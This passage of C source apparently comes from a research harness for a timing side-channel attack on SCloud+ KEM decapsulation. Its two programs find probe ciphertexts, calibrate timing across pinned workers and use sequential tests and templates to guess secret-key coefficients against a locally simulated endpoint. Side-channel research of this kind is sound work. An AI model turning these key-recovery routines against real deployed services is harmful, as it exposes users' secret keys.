        int fd=open(cache_path,O_WRONLY|O_CREAT|O_EXCL,0600);
        if(fd<0){perror("create new PROBE_CACHE");return 2;}
        FILE *cf=fdopen(fd,"wb");
        if(!cf){close(fd);unlink(cache_path);return 2;}
        int ok=fwrite(&hd,sizeof(hd),1,cf)==1 &&
               fwrite(pr,sizeof(probe_t),scloudplus_nbar,cf)==scloudplus_nbar;
        if(fclose(cf))ok=0;
        if(!ok){unlink(cache_path);fprintf(stderr,"probe cache write failed\n");return 2;}
        fprintf(stderr,"probe cache SAVED (public exhaustive proof) to %s\n",cache_path);
    }
    if(all_found){
        probe_cache_header_t hd;make_probe_header(&hd,pke_pk,ncoord,pr);
        printf("# probe_validation=%s-v%u cases=%llu pk_hash=",
               probe_public_cases()>PROBE_SAMPLE_THRESHOLD?"cached-public-buckets":"exhaustive",PROBE_VALIDATION_VERSION,
               (unsigned long long)probe_public_cases());
        for(unsigned j=0;j<sizeof(hd.pk_hash);j++)printf("%02x",hd.pk_hash[j]);
        printf(" probe_hash=");
        for(unsigned j=0;j<sizeof(hd.probe_hash);j++)printf("%02x",hd.probe_hash[j]);
        puts("");fflush(stdout);
    }
    unsigned cls_n[3]={0,0,0};
    for(unsigned i=0;i<ncoord;i++){
        if(pr[i].found) cls_n[pr[i].cls<3?pr[i].cls:0]++;
        fprintf(stderr,"  coord %2u: %s a=%2u delta=%+d cls=%u (%u tries) "
                "base[%zu,%zu,%zu] shift[%zu,%zu,%zu]\n",
                i,pr[i].found?"FOUND":"FAIL ",pr[i].a,pr[i].delta,pr[i].cls,pr[i].tries,
                pr[i].pb0[0],pr[i].pb0[1],pr[i].pb0[2],
                pr[i].pb1[0],pr[i].pb1[1],pr[i].pb1[2]);
    }
    fprintf(stderr,"offline search (parallel): %.1f s\n",
            (double)(mono_ns()-ot0)/1e9);
    fprintf(stderr,"probe classes: joint(base+shift)=%u  base-isolates-0=%u  "
            "base-trisects=%u  (of %u found)\n",
            cls_n[0],cls_n[1],cls_n[2],cls_n[0]+cls_n[1]+cls_n[2]);
    if(getenv("SEARCH_ONLY") && atoi(getenv("SEARCH_ONLY")))
        return cls_n[0]+cls_n[1]+cls_n[2]==ncoord ? 0 : 2;
    /* Recovery requires a usable probe for EVERY coordinate: a missing column has
     * no classifier and would silently decode as all-zero.  Abort with the list
     * of uncovered columns rather than report a partial-but-clean-looking result. */
    if(!all_found){
        fprintf(stderr,"RUN ABORTED: not all coords have a probe; missing:");
        for(unsigned i=0;i<ncoord;i++)
            if(!pr[i].found) fprintf(stderr," %u",i);
        fprintf(stderr,"\nIncrease max_tries or re-seed; recovery not attempted.\n");
        return 2;
    }
    /* ---- references (pk-only), built once, inherited by workers ----
     * Deterministic scan over counter-valued messages; histogram the refill
     * buckets and take (B,B+MIN_CLASS_GAP) with the highest min count
     * (early exit once both sides are seen >=4 times).  Level-256 keys land
     * on 53/54, matching the recorded runs. */
    static uint8_t m_lo[scloudplus_ss]={0},m_hi[scloudplus_ss]={0};
    {
        enum { NBH = 1024, REF_SCAN = 200000, REF_MIN = 4 };
        static unsigned bcount[NBH]; static uint32_t bfirst[NBH];
        memset(bcount,0,sizeof(bcount)); memset(bfirst,0xff,sizeof(bfirst));
        for(unsigned c=0;c<REF_SCAN;c++){ uint8_t m[scloudplus_ss]={0};
            for(unsigned j=0;j<8;j++)m[j]=(uint8_t)((uint64_t)c>>(8*j));
            size_t b,r; profile_message(pke_pk,m,&b,&r);
            if(b<NBH){ if(bcount[b]++==0) bfirst[b]=c; }
            if((c&63)==63){   /* periodic check: solid adjacent pair yet? */
                unsigned bm=0,blo=0;
                for(unsigned bb=0;bb+MIN_CLASS_GAP<NBH;bb++){
                    unsigned mn=bcount[bb]<bcount[bb+MIN_CLASS_GAP]?bcount[bb]:bcount[bb+MIN_CLASS_GAP];
                    if(mn>bm){bm=mn;blo=bb;} }
                if(bm>=REF_MIN){B_LO=(int)blo;goto refs_done;} }
        }
        unsigned bm=0,blo=0;   /* full-scan fallback: best pair seen at all */
        for(unsigned bb=0;bb+MIN_CLASS_GAP<NBH;bb++){
            unsigned mn=bcount[bb]<bcount[bb+MIN_CLASS_GAP]?bcount[bb]:bcount[bb+MIN_CLASS_GAP];
            if(mn>bm){bm=mn;blo=bb;} }
        if(bm>=1)B_LO=(int)blo;
    refs_done:
        if(B_LO<0){fprintf(stderr,"no refs\n");return 2;}
        B_HI=B_LO+MIN_CLASS_GAP;
        for(unsigned j=0;j<8;j++){ m_lo[j]=(uint8_t)((uint64_t)bfirst[B_LO]>>(8*j));
                                   m_hi[j]=(uint8_t)((uint64_t)bfirst[B_HI]>>(8*j)); }
        fprintf(stderr,"refs: buckets %d/%d (first msg idx %u/%u)\n",
                B_LO,B_HI,bfirst[B_LO],bfirst[B_HI]);
    }
    static uint8_t ct_lo[scloudplus_ctx],ct_hi[scloudplus_ctx];
    build_ref_ct(m_lo,ct_lo); build_ref_ct(m_hi,ct_hi);
    if(getenv("PROFILE_ONLY") && atoi(getenv("PROFILE_ONLY"))){
        printf("kind,coord,axis,trit,bucket,rounds\n");
        for(unsigned r=0;r<2;r++){
            size_t b,rounds;
            profile_message(pke_pk,r?m_hi:m_lo,&b,&rounds);
            printf("reference,-1,%u,0,%zu,%zu\n",r,b,rounds);
        }
        for(unsigned i=0;i<ncoord;i++){
            uint16_t vs[scloudplus_nbar];memcpy(vs,pr[i].v,sizeof(vs));
            vs[i]=(uint16_t)((vs[i]+pr[i].delta+scloudplus_q)&scloudplus_q_mask);
            for(unsigned axis=0;axis<2;axis++){
                uint8_t mu[3][scloudplus_ss];
                search_decode(axis?vs:pr[i].v,i,pr[i].a,mu);
                for(int t=0;t<3;t++){
                    size_t b,rounds;profile_message(pke_pk,mu[t],&b,&rounds);
                    printf("candidate,%u,%u,%d,%zu,%zu\n",i,axis,t-1,b,rounds);
                }
            }
        }
        return 0;
    }

    /* ---- build flat work list ---- */
    unsigned step=scloudplus_n/per_coord; if(!step)step=1;
    /* step truncates down, so the sampling loop runs ceil(n/step) times,
     * which can exceed per_coord; size cap from the real iteration count. */
    size_t per_coord_items=((size_t)scloudplus_n+step-1)/step;
    size_t cap=(size_t)ncoord*per_coord_items+ncoord, nit=0;
    item_t*items=malloc(sizeof(item_t)*cap);
    if(!items){perror("malloc work items");return 3;}
    for(unsigned i=0;i<ncoord;i++){ if(!pr[i].found) continue;
        for(unsigned k=0;k<scloudplus_n;k+=step){ items[nit].coord=i; items[nit].pos=k; nit++; } }
    /* Optional exact supplement list; independent of truth/noiseless buckets. */
    const char *retest_path=getenv("RETEST_CSV");
    if(retest_path && *retest_path){
        FILE *rf=fopen(retest_path,"r");
        if(!rf){perror("RETEST_CSV");free(items);return 2;}
        size_t maxitems=(size_t)ncoord*scloudplus_n;
        item_t *selected=malloc(sizeof(*selected)*maxitems);
        unsigned char *seen=calloc(maxitems,1);
        if(!selected||!seen){fclose(rf);free(selected);free(seen);free(items);return 3;}
        char line[128];unsigned lineno=0;size_t count=0;int bad=0;
        while(fgets(line,sizeof(line),rf)){
            unsigned ci,ki;char extra;lineno++;
            if(lineno==1 && (!strcmp(line,"coord,position\n") || !strcmp(line,"coord,position\r\n")))continue;
            if(sscanf(line,"%u,%u %c",&ci,&ki,&extra)!=2 || ci>=ncoord || ki>=scloudplus_n || !pr[ci].found){bad=1;break;}
            size_t index=(size_t)ci*scloudplus_n+ki;
            if(seen[index]){bad=1;break;}seen[index]=1;
            selected[count++]=(item_t){ci,ki};
        }
        if(ferror(rf))bad=1;
        fclose(rf);free(seen);free(items);
        if(bad || !count){fprintf(stderr,"invalid/empty RETEST_CSV at line %u\n",lineno);free(selected);return 2;}
        items=selected;nit=count;
        fprintf(stderr,"RETEST_CSV selected %zu exact positions\n",nit);
    }
    if(!nit){fprintf(stderr,"no probes found; nothing to time\n");
        free(items); return 2;}

    /* shared result array (visible to all workers) */
    res_t*res=mmap(NULL,sizeof(res_t)*nit,PROT_READ|PROT_WRITE,
                   MAP_SHARED|MAP_ANONYMOUS,-1,0);
    if(res==MAP_FAILED){perror("mmap");return 3;}
    memset(res,0,sizeof(res_t)*nit);
    /* shared per-worker calibrated gap, for reporting */
    double*wgap=mmap(NULL,sizeof(double)*nworkers,PROT_READ|PROT_WRITE,
                     MAP_SHARED|MAP_ANONYMOUS,-1,0);
    if(wgap==MAP_FAILED){perror("mmap wgap");return 3;}

    /* ---- batching + calibration-serialisation knobs ----
     * BATCH_WORKERS=B (0/unset => nworkers): run the measurement in waves of
     *   at most B concurrently-pinned workers.  The ROUND-ROBIN work slice is
     *   unchanged (offset=g, stride=nworkers), so the SAME coeffs are measured
     *   -- only their wall-clock concurrency is reduced.  "6 workers in two
     *   waves of 3" = BATCH_WORKERS=3 nworkers=6.  Each wave re-forks, so each
     *   wave RE-CALIBRATES its gap under its own (lighter) load condition.
     * SERIAL_CAL=1 (default 0): inside a wave, workers calibrate ONE AT A TIME
     *   (shared turn token) and then cross a barrier before any of them starts
     *   timing.  This makes the calibration phase serial (each core measures
     *   its gap with no sibling contention) while the measurement phase stays
     *   parallel.  NOTE: this intentionally departs from the legacy "calibrate
     *   under full parallel load" design;
     *   it yields a lighter-load gap, reported per worker so the two regimes
     *   stay comparable.  Default 0 = legacy concurrent, loaded calibration. */
    /* cross-process calibration sync: [0]=whose turn to calibrate (batch-local
     * index), [1]=count that have finished calibrating (barrier). */
    int*csync=mmap(NULL,sizeof(int)*2,PROT_READ|PROT_WRITE,
                            MAP_SHARED|MAP_ANONYMOUS,-1,0);
    if(csync==MAP_FAILED){perror("mmap csync");return 3;}

    fprintf(stderr,"work items=%zu, %u workers in waves of %u%s\n",
            nit,nworkers,BW,serial_cal?" (serial calibration)":"");
    uint64_t w0=mono_ns();

    int worker_failed=0;
    for(unsigned bstart=0;bstart<nworkers;bstart+=BW){
        unsigned bend=bstart+BW; if(bend>nworkers) bend=nworkers;
        unsigned bsz=bend-bstart;
        csync[0]=0; csync[1]=0; __sync_synchronize();
        fprintf(stderr,"-- wave: workers %u..%u on cores ",bstart,bend-1);
        for(unsigned g=bstart;g<bend;g++) fprintf(stderr,"%d%s",CORES[g],g+1<bend?",":"\n");

    for(unsigned g=bstart;g<bend;g++){
        pid_t pid=fork();
        if(pid<0){perror("fork");return 4;}
        if(pid==0){
            /* ---- WORKER ---- */
            unsigned bi=g-bstart;   /* position within this wave */
            int affinity_ok=pin_core(CORES[g])==0;
            if(!affinity_ok) perror("worker affinity");
            /* own RNG stream so interleave coin differs per worker */
            rng = 0x243f6a8885a308d3ULL ^ (0x9e3779b97f4a7c15ULL*(g+1));
            /* serial calibration: wait for our turn so no sibling is timing
             * on another core while we calibrate. */
            if(serial_cal)
                wait_until(csync+0,(int)bi);
            for(unsigned i=0;i<200;i++){(void)time_decaps(sk,ct_lo);(void)time_decaps(sk,ct_hi);}
            double gap=calibrate(sk,ct_lo,ct_hi,Ncal,g)/(B_HI-B_LO);
            wgap[g]=gap;
            /* barrier: in serial mode, release the next worker to calibrate,
             * then wait until the whole wave has calibrated before timing, so
             * no calibration overlaps anyone's measurement. */
            if(serial_cal){
                advance(csync+0);
                advance(csync+1);
                wait_until(csync+1,(int)bsz);
            }
            /* Leave the serial-calibration barrier before reporting failure,
             * otherwise sibling workers can wait forever. */
            if(!affinity_ok || !isfinite(gap)) _exit(5);
            double*db=malloc(sizeof(double)*N),*ds=malloc(sizeof(double)*N);
            double *scratch=malloc(sizeof(double)*N);
            if(!db || !ds || !scratch){perror("malloc worker samples");_exit(5);}

            char rawpath[1024];snprintf(rawpath,sizeof(rawpath),"%s/raw-%u.csv",getenv("SPRT_OUT"),g);
            FILE *raw=fopen(rawpath,"wx");if(!raw)_exit(6);
            unsigned processed=0;
            for(size_t it=g; it<nit; it+=nworkers){
                if(processed && processed%128==0){
                    gap=calibrate(sk,ct_lo,ct_hi,Ncal,g)/(B_HI-B_LO);
                    if(!isfinite(gap))_exit(5);
                }   /* round-robin slice */
                unsigned i=items[it].coord, k=items[it].pos;
                probe_t*p=&pr[i];
                uint16_t vs[scloudplus_nbar]; memcpy(vs,p->v,sizeof(vs));
                vs[i]=(uint16_t)((vs[i]+p->delta+scloudplus_q)&scloudplus_q_mask);
                uint8_t ctb[scloudplus_ctx],cts[scloudplus_ctx];
                build_probe_ct(p->v,k,p->a,ctb); build_probe_ct(vs,k,p->a,cts);

                sprt_state state[2];int buckets[2];
                sequential_measure(sk,ctb,cts,ct_lo,p,gap,N,db,ds,state,buckets,raw,i,k);
                double mb=0,ms=0;
                if(state[0].n)mb=summarize_samples(db,state[0].n,scratch,&res[it].mad_a,&res[it].half_delta_a);
                if(state[1].n)ms=summarize_samples(ds,state[1].n,scratch,&res[it].mad_b,&res[it].half_delta_b);
                double refs[32];for(unsigned j=0;j<32;j++)refs[j]=time_difference(sk,ct_hi,ct_lo);
                double local=med(refs,32)/(B_HI-B_LO);
                int ref_ok=reference_valid(local,gap),guess=99;
                if(ref_ok && buckets[0]>=0 && buckets[1]>=0)
                    for(int t=0;t<3;t++)if(p->pb0[t]==(size_t)buckets[0] && p->pb1[t]==(size_t)buckets[1])guess=t-1;
                res[it].guess=guess;res[it].true_v=99;res[it].nb=res[it].ns=255;
                res[it].tb=buckets[0]<0?255:buckets[0];res[it].ts=buckets[1]<0?255:buckets[1];
                res[it].ma=mb;res[it].mb=ms;res[it].own_gap=gap;res[it].local_ref=local;res[it].ref_ok=ref_ok;
                res[it].na=state[0].n;res[it].nbshots=state[1].n;
                res[it].loge_a=fmax(sprt_logmix(state[0].low),sprt_logmix(state[0].high));
                res[it].loge_b=fmax(sprt_logmix(state[1].low),sprt_logmix(state[1].high));
                res[it].done=1;processed++;
                if(processed%64==0){
                    fflush(raw);
                    fprintf(stderr,"SPRT_PROGRESS worker=%u coefficients=%u calls=%llu seconds=%.3f\n",g,processed,sprt_calls,(mono_ns()-w0)/1e9);
                }
            }
            fclose(raw);
            fprintf(stderr,"SPRT_DONE worker=%u coefficients=%u calls=%llu seconds=%.3f\n",g,processed,sprt_calls,(mono_ns()-w0)/1e9);
            free(db);free(ds);free(scratch);
            _exit(0);
        }
    }
    for(unsigned g=bstart;g<bend;g++){
        int status;
        if(wait(&status)<0 || !WIFEXITED(status) || WEXITSTATUS(status)) worker_failed=1;
    }
    }   /* end wave */
    double wall=(double)(mono_ns()-w0)/1e9;

    if(worker_failed) fprintf(stderr,"RUN FAILED: worker failure; following results are partial diagnostics only\n");
    /* ---- aggregate ---- */
    printf("coord,position,true,guess,tb_base,tb_shift,nb_base,nb_shift,channel_ok,recover_ok,worker,median_a_ns,median_b_ns,gap_ns,ref_bucket,a_neg,a_zero,a_pos,b_neg,b_zero,b_pos,mad_a_ns,mad_b_ns,half_delta_a_ns,half_delta_b_ns,n_a,n_b,ref_ok,local_ref_ns,loge_a,loge_b\n");
    unsigned long tot=0,ch=0,rec=0,nz=0,nzok=0,undone=0;
    for(size_t it=0; it<nit; it++){
        if(!res[it].done){undone++; continue;}
        int cok=(res[it].tb==res[it].nb)&&(res[it].ts==res[it].ns);
        int rok=(res[it].guess==res[it].true_v);
        tot++; ch+=cok; rec+=rok; if(res[it].true_v){nz++;nzok+=rok;}
        printf("%u,%u,%d,%d,%u,%u,%u,%u,%d,%d",items[it].coord,items[it].pos,
               res[it].true_v,res[it].guess,res[it].tb,res[it].ts,
               res[it].nb,res[it].ns,cok,rok);
            { unsigned ci=items[it].coord, w=it%nworkers;
              const size_t *a=pr[ci].pb0,*b=pr[ci].pb1;
              printf(",%u,%.17g,%.17g,%.17g,%zu,%zu,%zu,%zu,%zu,%zu,%zu",
                     w,res[it].ma,res[it].mb,res[it].own_gap,(size_t)B_LO,
                     a[0],a[1],a[2],b[0],b[1],b[2]);
              printf(",%.17g,%.17g,%.17g,%.17g,%u,%u,%d,%.17g,%.17g,%.17g\n",res[it].mad_a,res[it].mad_b,
                     res[it].half_delta_a,res[it].half_delta_b,res[it].na,res[it].nbshots,res[it].ref_ok,res[it].local_ref,res[it].loge_a,res[it].loge_b); }
    }
    fflush(stdout);
    fprintf(stderr,"\nper-worker calibrated gap (ns):");
    for(unsigned w=0;w<nworkers;w++) fprintf(stderr," %.0f",wgap[w]);
    fprintf(stderr,"\n");

    fprintf(stderr,"SPRT_FINISHED coefficients=%lu undone=%lu cap=%u alpha=%.17g workers=%u wall=%.6f\n",tot,undone,N,sequential_alpha,nworkers,wall);
    free(items); free(memo);
    munmap(res,sizeof(res_t)*nit); munmap(wgap,sizeof(double)*nworkers);
    munmap((void*)csync,sizeof(int)*2);
    munmap(pr,sizeof(probe_t)*scloudplus_nbar);
    return (worker_failed || undone)?5:0;
}

/* Public candidate-message templates; no target trit or exact bucket oracle.
 * The local fixture owns sk solely to simulate the timing query endpoint.
 * args: seed cache public.pk out first_col last_col positions_per_col
 */
#include "template_sprt.h"
#define TEMPLATE_MAX_CAL 1024u
#define TEMPLATE_ATTEMPTS 3u
#define TEMPLATE_CAP 1000u

static int template_public_ct(const uint8_t *message,uint8_t *ct){
    uint16_t d[(size_t)scloudplus_mbar*scloudplus_nbar];
    uint8_t decoded[scloudplus_ss];
    msg_encode(message,d);msg_decode(d,decoded);
    if(memcmp(message,decoded,sizeof(decoded)))return 0;
    build_ref_ct(message,ct);return 1;
}

static int fit_templates(const uint8_t *sk,const probe_t *probe,unsigned col,unsigned epoch,unsigned attempt,unsigned ncal,
                         uint8_t *reference,template_pair pairs[3],FILE *template_log,FILE *raw){
    uint16_t vs[scloudplus_nbar];memcpy(vs,probe->v,sizeof(vs));
    vs[col]=(uint16_t)((int)vs[col]+probe->delta)&scloudplus_q_mask;
    uint8_t messages[2][3][scloudplus_ss];
    search_decode(probe->v,col,probe->a,messages[0]);
    search_decode(vs,col,probe->a,messages[1]);
    uint8_t ct[2][3][scloudplus_ctx];
    for(int a=0;a<2;a++)for(int t=0;t<3;t++)
        if(!template_public_ct(messages[a][t],ct[a][t]))return 0;
    memcpy(reference,ct[0][0],scloudplus_ctx);
    double train[2][3][TEMPLATE_MAX_CAL],held[2][3][TEMPLATE_MAX_CAL];
    double middle[2][3],mad[2][3],scratch[TEMPLATE_MAX_CAL];
    for(unsigned stage=0;stage<2;stage++){
        unsigned count=ncal;
        for(unsigned j=0;j<count;j++){
            unsigned order[6]={0,1,2,3,4,5};
            for(unsigned q=5;q;q--){unsigned r=xr()%(q+1),tmp=order[q];order[q]=order[r];order[r]=tmp;}
            for(unsigned q=0;q<6;q++){
                unsigned a=order[q]/3,t=order[q]%3;
                double x=time_difference(sk,ct[a][t],reference);
                if(stage)held[a][t][j]=x;else train[a][t][j]=x;
                fprintf(raw,"%u,%u,%u,%u,%u,%d,%u,%.17g\n",col,epoch,attempt,stage,a,(int)t-1,j,x);
            }
        }
        if(!stage){
            for(int a=0;a<2;a++)for(int t=0;t<3;t++){
                memcpy(scratch,train[a][t],sizeof(double)*ncal);middle[a][t]=med(scratch,ncal);
                for(unsigned j=0;j<ncal;j++)scratch[j]=fabs(train[a][t][j]-middle[a][t]);
                mad[a][t]=med(scratch,ncal);
            }
            for(int p=0;p<3;p++){
                int l=template_left[p],r=template_right[p];
                pairs[p]=(template_pair){.left=l,.right=r,.axis=0,.quality=-1};
                for(int a=0;a<2;a++){
                    if(!memcmp(messages[a][l],messages[a][r],scloudplus_ss))continue;
                    double quality=fabs(middle[a][r]-middle[a][l])/(mad[a][r]+mad[a][l]+1);
                    if(quality>pairs[p].quality){
                        pairs[p].axis=a;pairs[p].quality=quality;
                        pairs[p].right_high=middle[a][r]>middle[a][l];
                        pairs[p].boundary=.5*(middle[a][r]+middle[a][l]);
                    }
                }
                if(pairs[p].quality<0)return 0;
            }
        }
    }
    /* Fresh held-out samples, no boundary/axis selection on these observations.
     * Six one-sided Hoeffding bounds per attempt; split delta=.001 over three attempts.
     * This checks public controls, not an unconditional transfer guarantee. */
    double epsilon=sqrt(log(6*TEMPLATE_ATTEMPTS/.001)/(2*ncal));
    for(int p=0;p<3;p++){
        template_pair *pair=&pairs[p];unsigned correct[2]={0};
        for(int side=0;side<2;side++){
            int t=side?pair->right:pair->left;
            int high=side?pair->right_high:!pair->right_high;
            for(unsigned j=0;j<ncal;j++){
                double x=held[pair->axis][t][j];
                correct[side]+=high?x>pair->boundary:x<pair->boundary;
            }
        }
        pair->validated=(double)correct[0]/ncal-epsilon>.5 &&
                        (double)correct[1]/ncal-epsilon>.5;
        fprintf(template_log,"%u,%u,%u,%u,%d,%d,%d,%d,%.17g,%.17g,%u,%u,%d\n",col,epoch,attempt,ncal,pair->left-1,pair->right-1,
                pair->axis,pair->right_high,pair->boundary,pair->quality,correct[0],correct[1],pair->validated);
    }
    fflush(template_log);fflush(raw);return 1;
}

int main(int argc,char **argv){
    if(argc!=8){fprintf(stderr,"usage: template SEED CACHE PUBLIC_PK OUT FIRST_COL LAST_COL POSITIONS\n");return 2;}
    unsigned first=strtoul(argv[5],NULL,10),last=strtoul(argv[6],NULL,10),positions=strtoul(argv[7],NULL,10);
    if(first>last || last>=scloudplus_nbar || !positions || positions>scloudplus_n)return 2;
    int core=6;const char *core_env=getenv("TEMPLATE_CORE");
    if(core_env){char *end;long parsed=strtol(core_env,&end,10);
        if(!*core_env || *end || parsed<0 || parsed>=CPU_SETSIZE)return 2;
        core=(int)parsed;
    }
    if(pin_core(core))return 3;
    rng^=UINT64_C(0x9e3779b97f4a7c15)*(1u+first+17u*(unsigned)core);
    init_tsc();timing_abba=0;
    fprintf(stderr,"TEMPLATE core=%d alpha=.001 cap=1000 train=256,512,1024 refresh=128\n",core);
    uint64_t start=mono_ns();krng=strtoull(argv[1],NULL,10)|1ULL;
    uint8_t pk[scloudplus_pk],sk[scloudplus_kem_sk],expected[scloudplus_pk];
    if(scloud_kemkeygen(pk,sk))return 4;
    FILE *f=fopen(argv[3],"rb");
    if(!f || fread(expected,1,sizeof(expected),f)!=sizeof(expected) || fgetc(f)!=EOF)return 5;
    fclose(f);if(memcmp(pk,expected,sizeof(pk)))return 6;
    probe_t probes[scloudplus_nbar];probe_cache_header_t got,want;
    f=fopen(argv[2],"rb");
    if(!f || fread(&got,sizeof(got),1,f)!=1 || fread(probes,sizeof(probes),1,f)!=1 || fgetc(f)!=EOF)return 7;
    fclose(f);make_probe_header(&want,pk,scloudplus_nbar,probes);
    if(memcmp(&got,&want,sizeof(got)))return 8;
    memo=calloc(MEMO_SLOTS,sizeof(*memo));if(!memo)return 9;
    for(unsigned col=first;col<=last;col++)if(!probe_public_valid(want.pk_hash,&probes[col],col))return 10;
    char path[2048];
    snprintf(path,sizeof(path),"%s/templates.csv",argv[4]);FILE *templates=fopen(path,"wx");
    snprintf(path,sizeof(path),"%s/template-raw.csv",argv[4]);FILE *template_raw=fopen(path,"wx");
    snprintf(path,sizeof(path),"%s/raw.csv",argv[4]);FILE *raw=fopen(path,"wx");
    if(!templates || !template_raw || !raw)return 11;
    fputs("column,epoch,attempt,ncal,left,right,axis,right_high,boundary,quality,left_correct,right_correct,validated\n",templates);
    fputs("column,epoch,attempt,stage,axis,trit,sample,value\n",template_raw);
    fputs("column,position,axis,sample,value\n",raw);
    puts("column,epoch,attempt,position,guess,trusted,margin,n_a,n_b,score_neg,score_zero,score_pos");
    for(unsigned col=first;col<=last;col++){
        probe_t *p=&probes[col];template_pair pairs[3];uint8_t ref[scloudplus_ctx];unsigned chosen_attempt=0;
        /* Refit at each column and every 128 positions for longer captures. */
        for(unsigned item=0;item<positions;item++){
            if(item%128==0){
                for(unsigned attempt=0;attempt<TEMPLATE_ATTEMPTS;attempt++){
                    if(!fit_templates(sk,p,col,item/128,attempt,256u<<attempt,ref,pairs,templates,template_raw))return 12;
                    chosen_attempt=attempt;
                    if(pairs[0].validated && pairs[1].validated && pairs[2].validated)break;
                }
            }
            unsigned k=(unsigned)((uint64_t)item*scloudplus_n/positions);
            uint16_t vs[scloudplus_nbar];memcpy(vs,p->v,sizeof(vs));
            vs[col]=(uint16_t)((int)vs[col]+p->delta)&scloudplus_q_mask;
            uint8_t ct[2][scloudplus_ctx];build_probe_ct(p->v,k,p->a,ct[0]);build_probe_ct(vs,k,p->a,ct[1]);
            sprt_state states[3];for(int q=0;q<3;q++)sprt_init(&states[q]);
            unsigned counts[2]={0};int winner=-1;
            for(unsigned shot=0;shot<TEMPLATE_CAP && winner<0;shot++){
                unsigned begin=xr()&1;
                for(unsigned j=0;j<2;j++){
                    unsigned a=(begin+j)%2;int needed=0;
                    for(int q=0;q<3;q++)needed|=pairs[q].axis==(int)a;
                    if(!needed)continue;
                    double x=time_difference(sk,ct[a],ref);counts[a]++;
                    fprintf(raw,"%u,%u,%u,%u,%.17g\n",col,k,a,counts[a],x);
                    for(int q=0;q<3;q++)if(pairs[q].axis==(int)a && states[q].side<0)
                        sprt_add(&states[q],x,pairs[q].boundary);
                }
                if((shot+1)%16==0)winner=template_winner(pairs,states,.001,32);
            }
            double scores[3],margin;int best=template_best(pairs,states,scores,&margin);
            if(winner>=0){
                best=winner;double rival=-INFINITY;
                for(int t=0;t<3;t++)if(t!=best && scores[t]>rival)rival=scores[t];
                margin=scores[best]-rival;
            }
            printf("%u,%u,%u,%u,%d,%d,%.17g,%u,%u,%.17g,%.17g,%.17g\n",col,item/128,chosen_attempt,k,best-1,winner>=0,margin,
                   counts[0],counts[1],scores[0],scores[1],scores[2]);
            fflush(stdout);fflush(raw);
        }
        fprintf(stderr,"column=%u done positions=%u calls=%llu elapsed=%.3f\n",col,positions,sprt_calls,(mono_ns()-start)/1e9);
    }
    fclose(raw);fclose(templates);fclose(template_raw);free(memo);
    fprintf(stderr,"finished calls=%llu seconds=%.3f alpha=.001 cap=1000\n",sprt_calls,(mono_ns()-start)/1e9);
    return 0;
}
